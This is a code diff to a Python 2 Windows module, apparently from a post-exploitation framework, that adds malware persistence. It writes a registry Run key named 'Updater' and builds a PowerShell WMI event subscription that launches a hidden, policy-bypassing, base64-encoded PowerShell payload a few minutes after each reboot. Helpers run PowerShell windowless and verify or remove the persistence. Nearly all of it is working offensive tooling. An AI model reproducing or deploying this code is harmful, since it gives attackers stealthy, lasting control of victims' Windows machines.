@@ -16,20 +16,116 @@
 from _winreg import *
 import random
 import string
+import subprocess
+import _subprocess as sub
+from base64 import b64encode
+import os
 
-def add_registry_startup(bin_path):
-    randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
+# ---------------- Persistence using registry ----------------
+
+def add_registry_startup(cmd, name='Updater'):
+    aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
     try:
-        aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-        try:
-            SetValueEx(aKey, randname, 0, REG_SZ, bin_path)
-        finally:
-            CloseKey(aKey)
-    except Exception:
-        aKey2 = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-        try:
-            SetValueEx(aKey2, randname, 0, REG_SZ, bin_path)
-        finally:
-            CloseKey(aKey2)
+        SetValueEx(aKey, name, 0, REG_SZ, cmd)
+        CloseKey(aKey)
+        return True
+    except:
+        CloseKey(aKey)
+        return False
+
+def remove_registry_startup(name='Updater'):
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
+        DeleteValue(key, name)
+        CloseKey(key)
+        return True
+    except Exception, e:
+        return False
+
+# ---------------- Persistence using WMI event ----------------
+
+def main_powershell_code(startup, cmd_line, name):
+    return '''
+$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
+$filter.QueryLanguage = "WQL"
+$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
+$filter.Name = "[NAME]"
+$filter.EventNamespace = 'root\\cimv2'
+
+$result = $filter.Put()
+$filterPath = $result.Path
+
+$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
+$consumer.Name = '[NAME]'
+$consumer.CommandLineTemplate = '[COMMAND_LINE]'
+$consumer.ExecutablePath = ""
+$consumer.WorkingDirectory = "C:\\Windows\\System32"
+$result = $consumer.Put()
+$consumerPath = $result.Path
+
+$bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
+
+$bind.Filter = $filterPath
+$bind.Consumer = $consumerPath
+$result = $bind.Put()
+$bindPath = $result.Path
+'''.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
 
 
+def execute_powershell(cmdline):
+    info = subprocess.STARTUPINFO()
+    info.dwFlags = sub.STARTF_USESHOWWINDOW
+    info.wShowWindow = sub.SW_HIDE
+
+    command=['powershell.exe', '/c', cmdline]
+    p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
+    results, _ = p.communicate()
+    return results
+
+def check_if_persistence_created(name):
+    code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
+    result = execute_powershell(code)
+    if name in result:
+        return True
+    else:
+        return False
+
+def wmi_persistence(command=None, file=None, name='Updater'):
+    cmd = command
+    cmd_line = None
+
+    if not name:
+         name = 'Updater'
+
+    if file: 
+        if not os.path.exists(file):
+            return False, 'file not found: %s' % file
+        
+        # cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -C "cat %s | Out-String | iex"' % file
+        cmd_line = file
+    else:
+        cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % b64encode(cmd.encode('UTF-16LE'))
+
+    # the payload will be launched 4 minutes after the system reboot
+    startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+
+    powershell = main_powershell_code(startup, cmd_line, name)
+    execute_powershell(powershell)
+
+    if check_if_persistence_created(name):
+        return True
+    else:
+        return False
+
+def remove_wmi_persistence(name='Updater'):
+    code ='''
+Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
+Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
+Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject
+'''.replace('[NAME]', name)
+    
+    result = execute_powershell(code)
+    if not result:
+        return True
+    else:
+        return False
